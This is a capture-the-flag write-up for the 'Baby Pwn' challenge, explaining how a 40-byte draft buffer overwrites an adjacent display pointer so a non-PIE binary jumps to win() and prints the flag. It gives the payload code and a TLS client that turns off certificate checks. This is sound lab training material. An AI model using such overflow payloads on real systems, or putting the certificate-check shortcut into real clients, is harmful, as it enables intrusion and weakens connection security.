---
title: "Baby Pwn"
category: "Pwn"
tags: ["stack-overflow","pointer-overwrite","win-function","tls"]
solve_date: "2026-10-10"
language: "en"
---

# Baby Pwn

**Flag:** `FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_d3a9f581e8}`  
**Service:** `ncat --ssl baby-pwn-2dad64dd9c44.inst14.ctf.fortid.com 1337` (TLS on port 1337). Artifact: `handout.zip` 5.9 KB containing `chall` 17040 B (ELF non-PIE) and `chall.c`.

## Challenge

The service takes a review through a flow with two parts: a "draft" buffer for the note content and a preview path for the favourite entry. The supplied binary is non-PIE. The objective is to redirect control into `win()` so that the preview path prints the prize.

## Analysis

Inside the review flow the "draft" input area is exactly 40 bytes and the saved display pointer (the pointer to the routine that prints the preview content) sits adjacent to it. The recorded payload is 32 filler bytes plus an 8-byte address, so the last 8 bytes of that 40-byte span coincide with the display pointer: writing exactly 40 bytes is enough to retarget the pointer, with no further spill.

Payload layout: the first 32 bytes are filler, the next 8 bytes (offset 32–39) are the target address. On a non-PIE ELF the address of `win()` is fixed and comes straight out of the symbol table: `0x40135F`.

```python
payload = b"A" * 32 + p64(0x40135F)
```

`p64` packs `0x40135F` little-endian into 8 bytes, so the payload is exactly 40 bytes and matches the "draft" buffer size. When the favourite preview path runs, it dereferences the overwritten display pointer, jumps into `win()`, and `win()` prints the prize string.

## Solution

1. Read the address of `win()` from the symbol table of `chall` (non-PIE, so no base leak is needed): `0x40135F`.
2. Build the 40-byte payload `b"A"*32 + p64(0x40135F)`, covering the "draft" buffer and overwriting the display pointer.
3. Send the payload to the instance over TLS. The client uses Python's `ssl` module directly (see Directions Tested), since the other connection routes tried all failed at the TLS layer on this host.
4. Request the favourite preview. The service follows the display pointer, which now points at `win()`, and prints the prize with the flag:

   ```text
   > Five stars! Here is your prize:
   FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_d3a9f581e8}
   ```

## Result

```text
FortID{W0ah_My_F4v0r173_r3viw_C0n7a1n5_4_Fl4G_d3a9f581e8}
```

The flag was read directly from the challenge service. No submission response recorded.

## Reproduce

Requires Python 3 with the standard `ssl` module; pwntools is not needed for the network part because `remote(..., ssl=True)` fails on this host. `0x40135F` is fixed because `chall` is non-PIE and the address comes from the symbol table.

Payload:

```python
from struct import pack
payload = b"A" * 32 + pack("<Q", 0x40135F)
assert len(payload) == 40
```

Minimal client skeleton using the raw `ssl` module on port 1337. The `client.py` that was actually used is a local helper and is not part of the handout, so it is not reproduced verbatim here; the skeleton below is equivalent at the connection level:

```python
import socket, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
host = "baby-pwn-2dad64dd9c44.inst14.ctf.fortid.com"
s = ctx.wrap_socket(socket.socket(), server_hostname=host)
s.connect((host, 1337))
# after reading the banner: send the 40-byte draft payload, then request the favourite preview
```

Or ncat on a system where input redirection over TLS behaves:

```text
ncat --ssl baby-pwn-2dad64dd9c44.inst14.ctf.fortid.com 1337
```

The chain was executed against the live instance; the handout binary does not need to be run locally.
